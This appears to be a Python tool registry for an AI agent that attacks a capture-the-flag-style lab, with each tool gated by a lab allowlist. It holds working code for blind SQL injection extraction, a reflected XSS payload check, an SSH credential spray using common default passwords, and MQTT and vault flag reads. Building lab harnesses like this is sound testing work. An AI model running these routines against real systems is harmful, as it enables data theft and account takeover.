import socket
import time
import urllib.parse
import urllib.request

from . import lab_mqtt, lab_ssh, lab_vault, scope
from .core import RISK_HIGH, RISK_LOW, RISK_MEDIUM, observation


def _http_get(base, path_and_query, timeout=2.0):
    url = base + path_and_query
    with urllib.request.urlopen(url, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def port_status(host, port, timeout=0.5):
    try:
        s = socket.create_connection((host, int(port)), timeout)
    except OSError:
        return False, ""
    banner = ""
    try:
        s.settimeout(0.5)
        data = s.recv(64)
        banner = data.decode("utf-8", "replace").strip()
    except OSError:
        pass
    try:
        s.close()
    except OSError:
        pass
    return True, banner


def run_port_probe(ctx, args):
    target = args.get("target", "lab://all")
    kind, value, port = scope.parse_target(target)
    if not scope.safe(target):
        return observation(False, "refused: target outside lab allowlist",
                           {"target": target, "scope": scope.describe(target)})
    if kind == "lab":
        if value == "vault":
            present = ctx.lab.vault_present()
            return observation(present, "fixture-present" if present else "fixture-missing",
                               {"fixture": "vault", "path": lab_vault.vault_path("flag.txt")})
        if value == "all":
            results = []
            for name in ("http", "ssh", "mqtt"):
                ep = ctx.lab.endpoint(name)
                if not ep:
                    results.append(f"{name}:unknown")
                    continue
                host, pt = ep.rsplit(":", 1)
                ok, _b = port_status(host, int(pt))
                results.append(f"{name}:{'open' if ok else 'closed'}")
            any_open = any(":open" in r for r in results)
            return observation(any_open, ";".join(results), {"results": results})
        ep = ctx.lab.endpoint(value)
        if not ep:
            return observation(False, "lab-endpoint-unknown", {"endpoint": value})
        host, pt = ep.rsplit(":", 1)
        ok, banner = port_status(host, int(pt))
        return observation(ok, f"port-open:{pt}" if ok else f"port-closed:{pt}",
                           {"host": host, "port": int(pt), "banner": banner})
    ok, banner = port_status(value, port or 80)
    return observation(ok, f"port-open:{port or 80}" if ok else f"port-closed:{port or 80}",
                       {"host": value, "port": port or 80, "banner": banner})


def run_dyn_sqli(ctx, args):
    target = args.get("target", "lab://http")
    if not scope.safe(target):
        return observation(False, "refused: target outside lab allowlist", {"target": target})
    ep = ctx.lab.endpoint("http")
    base = f"http://{ep}"
    column = args.get("column", "secret")
    maxlen = int(args.get("maxlen", 40))

    def oracle(payload):
        body = _http_get(base, "/item?id=" + urllib.parse.quote(payload))
        return "ITEM_FOUND" in body

    result = ""
    requests = 0
    for pos in range(1, maxlen + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            query = f"1' AND (SELECT MID({column},{pos},1))>CHAR({mid})-- -"
            requests += 1
            if oracle(query):
                lo = mid + 1
            else:
                hi = mid
        ch = lo
        confirm = f"1' AND (SELECT MID({column},{pos},1))=CHAR({ch})-- -"
        requests += 1
        if not oracle(confirm):
            break
        result += chr(ch)
        if ch == 125:
            break
    ok = bool(result)
    return observation(ok, result if result else "<empty-extraction>",
                       {"requests": requests, "length": len(result), "column": column, "endpoint": ep})


def run_xss(ctx, args):
    target = args.get("target", "lab://http")
    payload = args.get("payload", "<script>alert(1)</script>")
    if not scope.safe(target):
        return observation(False, "refused: target outside lab allowlist", {"target": target})
    ep = ctx.lab.endpoint("http")
    base = f"http://{ep}"
    body = _http_get(base, "/comment?msg=" + urllib.parse.quote(payload))
    echoed = payload in body
    return observation(echoed, "XSS_ECHO:reflected" if echoed else "no-echo",
                       {"payload": payload, "echoed": echoed, "preview": body[:120]})


def run_mqtt_subs(ctx, args):
    target = args.get("target", "lab://mqtt")
    topic = args.get("topic", "vault/telemetry")
    if not scope.safe(target):
        return observation(False, "refused: target outside lab allowlist", {"target": target})
    ep = ctx.lab.endpoint("mqtt")
    host, pt = ep.rsplit(":", 1)
    messages = lab_mqtt.mqtt_subscribe(host, int(pt), topic)
    evidence = " | ".join(f"{t}={p}" for t, p in messages) if messages else "no-messages"
    ok = any("FLAG{" in p for _t, p in messages)
    return observation(ok, evidence, {"messages": messages, "topic": topic})


def _as_list(value, default):
    if value is None:
        return list(default)
    if isinstance(value, (list, tuple)):
        return [str(x) for x in value]
    return [x.strip() for x in str(value).split(",") if x.strip()]


def run_cred_spray(ctx, args):
    target = args.get("target", "lab://ssh")
    if not scope.safe(target):
        return observation(False, "refused: target outside lab allowlist", {"target": target})
    users = _as_list(args.get("users"), ["admin", "root", "svc", "lab"])
    passwords = _as_list(args.get("passwords"), ["hunter2", "toor", "admin", "password", "123456", "secret"])
    delay = float(args.get("delay", 0.01))
    ep = ctx.lab.endpoint("ssh")
    host, pt = ep.rsplit(":", 1)
    pairs = [(u, p) for u in users for p in passwords]
    matched = []
    attempted = 0
    offset = 0
    while offset < len(pairs):
        chunk = pairs[offset:offset + 8]
        results = lab_ssh.auth_session(host, int(pt), chunk)
        attempted += len(results)
        matched += [(u, p) for u, p, ok in results if ok]
        offset += len(chunk)
        time.sleep(delay)
    ok = bool(matched)
    evidence = "AUTH_SUCCESS:" + ",".join(f"{u}:{p}" for u, p in matched) if matched else "AUTH_FAIL:no-valid-creds"
    return observation(ok, evidence, {"attempts": attempted, "matched": matched})


def run_vault_read(ctx, args):
    target = args.get("target", "lab://vault")
    path = args.get("path", "flag.txt")
    if not scope.safe(target):
        return observation(False, "refused: target outside lab allowlist", {"target": target})
    try:
        content = lab_vault.read_fixture(path)
    except (ValueError, FileNotFoundError) as e:
        return observation(False, f"vault-read-error:{e}", {"path": path})
    flagged = "FLAG{" in content
    return observation(flagged, content, {"file": path, "flag": flagged, "fixture": "vault"})


def run_write_note(ctx, args):
    text = args.get("text") or args.get("note") or ""
    ctx.state.add_note(text)
    return observation(True, "note-recorded", {"note": text, "total": len(ctx.state.notes)})


def run_read_plan(ctx, args):
    plan = ctx.state.plan
    steps = [s.to_dict() for s in plan.steps] if plan else []
    return observation(True, f"plan:{len(steps)}-steps", {"steps": steps})


def run_query_state(ctx, args):
    data = ctx.state.to_dict()
    summary = f"state: iters={data['iters']} budget_used={data['budget_used']} budget={data['budget']} goal={data['goal']!r}"
    return observation(True, summary, data)


class ToolSpec:
    def __init__(self, name, run, risk, intents, yield_, prereqs, hint, blurb, meta=False):
        self.name = name
        self.run = run
        self.risk = int(risk)
        self.intents = set(intents)
        self.yield_ = int(yield_)
        self.prereqs = list(prereqs)
        self.hint = hint
        self.blurb = blurb
        self.meta = bool(meta)

    def to_dict(self):
        return {
            "name": self.name,
            "risk": self.risk,
            "intents": sorted(self.intents),
            "yield": self.yield_,
            "prereqs": self.prereqs,
            "hint": self.hint,
            "meta": self.meta,
            "blurb": self.blurb,
        }


REGISTRY = {
    "port_probe": ToolSpec(
        "port_probe", run_port_probe, RISK_LOW,
        ["scan", "probe", "recon", "port", "discover", "enumerate", "enum", "reachable", "gather", "service"],
        2, [], None, "Probe TCP service presence and banner on a target."),
    "dyn_sqli": ToolSpec(
        "dyn_sqli", run_dyn_sqli, RISK_MEDIUM,
        ["sqli", "sql", "inject", "injection", "injections", "blind", "boolean", "extract", "db", "database", "widget", "column"],
        4, ["port_probe:lab://http"], "http", "Boolean-based blind SQL injection extraction against the lab app."),
    "xss": ToolSpec(
        "xss", run_xss, RISK_MEDIUM,
        ["xss", "script", "reflect", "echo", "comment", "stored", "browser"],
        3, ["port_probe:lab://http"], "http", "Payload echo detection against the lab comment reflector."),
    "mqtt_subs": ToolSpec(
        "mqtt_subs", run_mqtt_subs, RISK_MEDIUM,
        ["mqtt", "broker", "publish", "subscribe", "topic", "message", "notice", "telemetry"],
        3, ["port_probe:lab://mqtt"], "mqtt", "Bad-subscribe proof against the no-auth lab broker."),
    "vault_read": ToolSpec(
        "vault_read", run_vault_read, RISK_MEDIUM,
        ["vault", "flag", "honeytoken", "canary", "file", "secret", "exfil", "token"],
        5, ["port_probe:lab://vault"], "vault", "Read a fixture file from the lab vault and trip the honeytoken."),
    "cred_spray": ToolSpec(
        "cred_spray", run_cred_spray, RISK_HIGH,
        ["ssh", "cred", "credential", "password", "spray", "brute", "knock", "login", "auth"],
        4, ["port_probe:lab://ssh"], "ssh", "Rate-limited credential spray against the lab SSH fixture."),
    "write_note": ToolSpec(
        "write_note", run_write_note, RISK_LOW,
        ["note", "log", "record", "annotate"], 0, [], None, "Append a note to the agent memory.", meta=True),
    "read_plan": ToolSpec(
        "read_plan", run_read_plan, RISK_LOW,
        ["plan", "schedule", "review"], 0, [], None, "Read the current plan from agent memory.", meta=True),
    "query_state": ToolSpec(
        "query_state", run_query_state, RISK_LOW,
        ["state", "status", "progress", "observations"], 0, [], None, "Query the agent state.", meta=True),
}


def invoke(ctx, name, args):
    spec = REGISTRY.get(name)
    if not spec:
        return observation(False, "unknown-tool", {"tool": name})
    return spec.run(ctx, args)